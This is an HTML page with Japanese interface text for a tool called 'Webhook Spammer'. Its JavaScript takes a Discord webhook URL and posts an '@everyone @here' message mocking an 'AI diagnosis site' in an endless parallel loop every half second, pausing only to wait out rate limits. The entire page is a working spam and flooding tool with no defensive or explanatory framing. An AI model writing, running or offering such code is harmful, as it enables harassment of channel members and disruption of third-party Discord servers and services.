<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Webhook Spammer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #1e1e1e;
      color: #fff;
      font-family: monospace;
      padding: 20px;
    }
    .card {
      background: #2c2f33;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
    }
    label, input, textarea, button {
      width: 100%;
      display: block;
      margin-top: 12px;
      font-size: 14px;
    }
    #log {
      margin-top: 20px;
      white-space: pre-wrap;
      background: #111;
      padding: 10px;
      border-radius: 6px;
      height: 200px;
      overflow-y: auto;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Webhook Spammer</h2>
    <label>Webhook URL</label>
    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." />
    <label>並列数（同時送信数）</label>
    <input type="number" id="threads" placeholder="例: 2" value="2" />
    <button onclick="start()">実行</button>
    <div id="log"></div>
  </div>

  <script>
    const log = (msg) => {
      const el = document.getElementById("log");
      el.textContent += msg + "\n";
      el.scrollTop = el.scrollHeight;
    };

    const sleep = (ms) => new Promise(r => setTimeout(r, ms));

    async function sendOne(webhook, message) {
      try {
        const res = await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message })
        });

        if (res.status === 204 || res.status === 200) {
          log("[✓] Sent");
        } else if (res.status === 429) {
          const json = await res.json();
          log("[!] Ratelimit: " + json.retry_after + "ms");
          await sleep(json.retry_after);
        } else {
          log("[×] Status: " + res.status);
        }
      } catch (e) {
        log("[ERR] " + e.message);
      }
    }

    async function start() {
      const webhook = document.getElementById("webhook").value.trim();
      const threads = parseInt(document.getElementById("threads").value.trim()) || 2;
      const message = "@everyone @here AI診断サイト（笑）";

      if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
        log("[×] Webhook URLが不正");
        return;
      }

      log(`>> スパム開始: ${threads}並列 / 0.5秒ごと`);

      while (true) {
        const jobs = [];
        for (let i = 0; i < threads; i++) {
          jobs.push(sendOne(webhook, message));
        }
        await Promise.all(jobs);
        await sleep(500); // 0.5秒インターバル
      }
    }

    // ※Webhookは過去メッセージの一覧取得不可のため、編集機能は無効化中
  </script>
</body>
</html>
